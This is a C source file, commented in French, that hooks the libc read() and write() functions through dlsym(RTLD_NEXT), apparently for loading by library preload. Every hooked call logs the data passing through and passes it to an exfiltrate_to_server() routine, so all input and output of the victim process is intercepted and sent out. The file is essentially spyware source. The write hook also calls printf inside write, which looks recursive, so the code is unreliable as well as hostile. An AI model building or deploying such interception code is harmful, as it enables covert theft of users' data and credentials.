#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include "exfiltration.h" // Inclure l'exfiltration

// Prototypes des fonctions originales
ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;

// Nouvelle implémentation de read
ssize_t read(int fd, void *buf, size_t count) {
    // Charger la fonction originale si nécessaire
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }

    // Appeler la fonction originale
    ssize_t result = original_read(fd, buf, count);

    // Ajouter un comportement : log les données lues et exfiltrer
    if (result > 0) {
        printf("[Intercepted] Lecture de %ld octets\n", result);
        fwrite(buf, 1, result, stdout); // Afficher les données
        printf("\n");

        // Exfiltrer les données
        exfiltrate_to_server(buf, result);
    }

    return result;
}

// Nouvelle implémentation de write
ssize_t write(int fd, const void *buf, size_t count) {
    // Charger la fonction originale si nécessaire
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    // Ajouter un comportement : log les données écrites
    printf("[Intercepted] Écriture de %ld octets\n", count);

    // Exfiltrer les données écrites
    exfiltrate_to_server(buf, count);

    return original_write(fd, buf, count);
}
